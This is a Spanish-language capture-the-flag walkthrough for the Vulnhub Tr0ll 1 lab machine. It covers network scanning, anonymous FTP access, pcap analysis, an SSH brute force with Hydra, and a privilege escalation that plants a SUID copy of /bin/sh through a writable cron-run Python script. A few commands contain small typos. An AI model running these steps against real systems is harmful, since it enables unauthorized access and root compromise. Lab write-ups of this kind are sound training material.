<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=F7F400&width=200&height=80&lines=TR0LL_1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/tr0ll-1,100/

</br>

- *Paso 1:* Identificar la IP de la máquina host con NetDiscover. 
```
netdiscover -i wlan0 -r 192.168.1/24
```
![1](https://user-images.githubusercontent.com/75953873/176079905-f35a37e9-416f-45a8-8f7e-3c49899c7252.png)

IP host: `192.168.1.4`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.4
```
![2](https://user-images.githubusercontent.com/75953873/176080128-62ec0641-3cfa-479f-8d07-737fc130d1aa.png)

Puertos abiertos: [21,22,80]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 21,22,80 -A 192.168.1.4
```
![3](https://user-images.githubusercontent.com/75953873/176081118-60dbaddd-22c5-48c2-9232-a18565c084e1.png)

Servidor corriendo: **HTTP Apache**

Servicio FTP: permite el inicio se sesión anónimo.

O.S: **Linux**

URL: `http://192.168.1.4`

![4](https://user-images.githubusercontent.com/75953873/176081949-b1bb16cd-4a6f-4c5a-9abf-136aa5cc5c53.png)

- *Paso 4:* Loguearse al servicio FTP. 
```
ftp 192.168.1.4
```
Usuario: `anonymous`

Contraseña: `anonymous`

Copiar el archivo `lol.pcap` hacia el directorio local:
```
get lol.pcap
```
![5](https://user-images.githubusercontent.com/75953873/176082571-6e2485ce-3890-4e4e-a022-40aeebc2310c.png)

- *Paso 5* Examinar captura de paquetes con Wireshark. 
```
wireshark lol.pcap
```
![6](https://user-images.githubusercontent.com/75953873/176084226-03fe75a3-9b3a-459a-96e7-c70f8112f8cc.png)

Aplicar filtro: `(ip.addr eq 10.0.0.6 and ip.addr eq 10.0.0.12) and (tcp.port eq 20 and tcp.port eq 51884)`

Directorio secreto: `sup3rs3cr3tdirlol`

URL completa: `http://192.168.1.4/sup3rs3cr3tdirlol`

![7](https://user-images.githubusercontent.com/75953873/176085343-f3ea1169-da6f-4107-b70e-bf9e439c2010.png)

Descargar archivo: 
```
wget http://192.168.1.4/sup3rs3cr3tdirlol/roflmao
```

Explorar el archivo con Strings:
```
string roflmao
```
![8](https://user-images.githubusercontent.com/75953873/176085855-ffc26116-24d7-4c34-87d4-578fa54dddbb.png)

Directorio secreto: `0x0856BF`

URL completa: `http://192.168.1.4/0x0856BF`

![9](https://user-images.githubusercontent.com/75953873/176086028-06516837-d580-49de-8f15-c045b71909ff.png)

El directorio `good_luck` contiene un fichero txt con una lista de nombres para realizar un ataque de fuerza bruta y conectarse al servicio **SSH**. 

URL completa: `http://192.168.1.4/0x0856BF/good_luck/which_one_lol.txt`
```
wget http://192.168.1.4/0x0856BF/good_luck/which_one_lol.txt && cat which_one_lol.txt
```
![10](https://user-images.githubusercontent.com/75953873/176086596-77994340-98ef-4c9c-8231-5963d17a4c17.png)

- *Paso 6* Ataque de fuerza bruta al servicio SSH con Hydra. 
```
hydra -L which_one_lol.txt -P rockyou.txt 192.168.1.4 ssh
```
![11](https://user-images.githubusercontent.com/75953873/176089030-02ebf4c5-56d9-4a11-89a1-34ab99c0e119.png)

Usuario: `overflow`

Contraseña: `Pass.txt`

Iniciar sesión al servicio SSH:
```
ssh overflow@192.168.1.4
```

- *Paso 7* Filtrar todos los directorios y escalar privilegios root. 
```
find / -writable 2<dev/null
```
![12](https://user-images.githubusercontent.com/75953873/176089628-cc8a60fd-7cd4-4e17-b2bc-1979707d85af.png)

Directorio objetivo: `/lib/log`

Con el editor de Nano hay que remplazar la línea de `rm -r /tmp/` por las siguientes:
```python
```
#!/usr/bin/env python
import os
import sys
try:
        os.system('cp /bin/sh /tmp/sh ')
        os.system('chmod u+s /tmp/sh')
except:
        sys.exit()

```
